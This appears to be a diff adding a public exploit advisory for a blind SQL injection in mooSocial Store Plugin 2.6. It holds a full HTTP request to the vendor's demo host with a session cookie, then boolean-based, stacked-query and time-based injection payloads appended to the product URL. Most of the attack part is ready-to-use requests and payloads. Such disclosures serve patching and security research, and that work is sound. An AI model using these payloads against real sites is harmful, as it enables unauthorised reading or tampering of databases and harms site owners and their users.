@@ -1,0 +1,44 @@
+# Exploit Title: mooSocial Store Plugin 2.6 - SQL Injection
+# Exploit Author: Andrea Bocchetti
+# Date: 2018-08-28
+# Google Dork: N/A - 
+# Vendor: https://moosocial.com/product/store-plugins/
+# Software Link: https://moosocial.com/product/store-plugins/
+# Demo URL: http://addons.moosocial.com/stores
+# Purchase link: https://moosocial.com/addons/
+# Affected Version: all versions
+# Patched Version: 2.7
+# Category: Web Application
+# Platform: PHP
+# Tested on: Ubuntu
+# CVE: N/A
+  
+# 1. Technical Description:
+# mooSocial Store Plugin is affected by Blind SQL Injection in the product parameter used with URL Rewrite 
+   
+GET /stores/product/2015-fashion-new-men-39-s-short-sleeved-shirt-slim-m-3xl-65 HTTP/1.1
+Host: addons.moosocial.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: CAKEPHP=2b0v0a2360nhl46psmm1mejsi7
+Connection: close
+Upgrade-Insecure-Requests: 1
+ 
+ 
+# 3. Payload:
+ 
+# Parameter: #1* (URI)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause
+
+Payload: http://xxx.xxx/stores/product/2015-fashion-new-men-39-s-short-sleeved-shirt-slim-m-3xl-65 AND 5011=5011
+    
+# Type: stacked queries
+# Title: MySQL > 5.0.11 stacked queries (comment)
+# Payload: http://xxx.xxx/stores/product/2015-fashion-new-men-39-s-short-sleeved-shirt-slim-m-3xl-65;SELECT SLEEP(5)#
+# Type: AND/OR time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind
+    
+Payload: http://xxx.xxx/stores/product/2015-fashion-new-men-39-s-short-sleeved-shirt-slim-m-3xl-65 AND SLEEP(5)
